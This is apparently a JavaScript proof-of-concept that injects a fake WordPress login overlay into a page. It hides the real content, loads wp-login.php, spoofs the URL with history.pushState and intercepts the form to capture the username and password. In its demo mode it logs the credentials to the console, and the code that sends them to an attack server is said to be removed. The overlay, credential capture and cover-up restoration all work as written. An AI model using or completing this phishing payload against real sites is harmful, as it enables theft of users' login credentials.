// dom ready
$(function () {
    // setup area
    var wpLoginUrl = '/wp-login.php'; // path to wp-login.php
    var simulatedNetworkDelay = 1000; // in ms
    var simulationOnly = true; // log to console instead send credentials for demo purposes

    var $head = $('head');
    var $body = $('body');

    // mark & hide original elements
    $head.children().attr('data-pe-original', '1');
    $body.children().attr('data-pe-original', '1').hide();

    // base container
    var $container = $('<div class="pe-container" id="login"></div>');
    $('body')
        .append($container)
        .append('<div class="clear"></div>');

    // load wp-login.php
    var $login = $('<div></div>');
    $login.load(wpLoginUrl, function () {
        // fill html
        $container.append($login.find('#login').children());
        $body.attr('data-pe-original-class', $body.attr('class'));
        $body.attr('class', 'login js login-action-login wp-core-ui locale-de-de');

        // replace stylesheets
        $head.find('link[rel="stylesheet"]').each(function () {
            var $this = $(this);
            $this.attr('data-pe-original-href', $this.attr('href'));
            $this.attr('href', '');
        });
        $login.find('link[rel="stylesheet"]').each(function () {
            var $this = $(this);
            $head.append($this);
        });

        // manipulate url and title via history pushState
        history.pushState({}, $login.find('title').text(), wpLoginUrl);

        // login form event override
        $('form#loginform').on('submit', function (e) {
            e.preventDefault();

            var username = $('#user_login').val();
            var password = $('#user_pass').val();
            var credentialsUrlPart = 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
            if (simulationOnly) {
                console.info('username:', username);
                console.info('password:', password);
            }
            else {
                // TODO
                // actual submission code to send credentials to attack server removed to prevent script kiddie attacks
            }

            // simulate network delay
            setTimeout(function () {
                // restore html
                $container.remove();
                $('body > :not([data-pe-original]), head > :not([data-pe-original]').remove();
                $body.find('[data-pe-original]').show();
                $body.attr('class', $body.attr('data-pe-original-class'));

                // restore stylesheets
                $head.find('link[rel="stylesheet"]').each(function () {
                    var $this = $(this);
                    var originalHref = $this.attr('data-pe-original-href');
                    if (originalHref) $this.attr('href', originalHref);
                    else $this.attr('href', '');
                });

                // restore history
                window.history.back();
            }, simulatedNetworkDelay);
        });
    });
});
